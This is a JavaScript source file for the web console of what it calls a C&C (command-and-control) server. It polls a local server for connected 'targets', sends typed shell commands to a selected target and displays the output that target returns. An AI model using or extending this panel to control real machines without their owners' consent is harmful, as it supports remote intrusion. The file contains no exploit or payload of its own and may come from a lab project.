var tgtTemplate1 = "<div id='res-div"
var tgtTemplate2 = "' style='width: 100%; height: 80%;overflow-y: scroll' class='tabcontent'><ul id='res-list"
var tgtTemplate3 = "' style='list-style: none'></ul></div>"

var linkTemplate1 = '<li><a href="javascript:void(0)" class="tablinks" onclick="setTarget(event, '; // Put targetid here
var linkTemplate2 = ')">'; // Put target name here
var linkTemplate3 = '</a></li>';
var _targets = [];
var _active = null;
$("#command").keypress(function(e){
  console.log(_active)
  if (_active == null) return;
  if (e.which !== 13){
    return;
  }
  var command = {command: $("#command").val()}
  console.log("Sending command "+command)
  $("#command").val("");
  $.ajax({
    type: "POST",
    url: 'http://localhost:8083/command/'+_active.toString(),
    data: command,
    success: function(res){
      console.log("Command received by C&C");
    },
    dataType: "json"
  });
});

function setTarget(evt, targetid) {
    console.log(targetid)
    _active = targetid;
    targetid = 'res-div'+targetid;
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    document.getElementById(targetid).style.display = "block";
    evt.currentTarget.className += " active";
}

function getTargets(){
  $.getJSON("http://localhost:8083/getTargets", function(data){
    console.log("Received list of targets: "+data.targets);
    if (data.targets.length !== 0){
      data.targets.forEach(function(target){
        if ($.inArray(target, _targets) == -1) { // If the target is new
          $("#target-div").append(linkTemplate1+target.toString()+linkTemplate2+target.toString()+linkTemplate3);
          $("#main").append(tgtTemplate1+target.toString()+tgtTemplate2+target.toString()+tgtTemplate3);
          _targets.push(target);
        }
      });
    };
  })
}

function getResponse(){
  if (_active === null) return;
  $.getJSON("http://localhost:8083/response/"+_active.toString(), function(data){
    console.log("Received response from target: "+data.response);
    if (data !== ""){
      console.log(data.response);
      data.response.split("\n").forEach(function(resline){
        var resList = $("#res-list"+_active.toString());
        var resDiv = $("#res-div"+_active.toString());
        resList.append("<li>"+resline+"</li>");
        resDiv.scrollTop(resDiv.prop("scrollHeight"));
      });
    };
  })
}

setInterval(getResponse, 200);
setInterval(getTargets, 2000);
